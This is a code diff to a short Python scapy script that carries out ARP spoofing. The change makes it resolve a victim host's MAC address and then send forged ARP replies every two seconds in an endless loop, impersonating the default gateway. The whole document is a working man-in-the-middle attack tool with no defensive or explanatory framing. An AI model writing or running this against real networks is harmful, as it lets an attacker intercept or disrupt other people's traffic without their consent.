@@ -1,4 +1,5 @@
 from scapy.all import ARP, Ether, srp, send
+import time 
 
 IP_adress = "192.168.1.187"
 default_gateway = "192.168.1.1"
@@ -10,8 +11,12 @@ def get_MAC_adress():
     MAC_adress = answered[0][1].hwsrc
     return MAC_adress
 
-def spoof():
+def spoof(victim_MAC):
     global IP_adress
-    victim_MAC = get_MAC_adress()
     packet = ARP(op=2, pdst=IP_adress, hwdst=victim_MAC, psrc=default_gateway)
     send(packet, verbose=False)
+
+victim_MAC = get_MAC_adress()
+while True:
+    spoof(victim_MAC)
+    time.sleep(2)
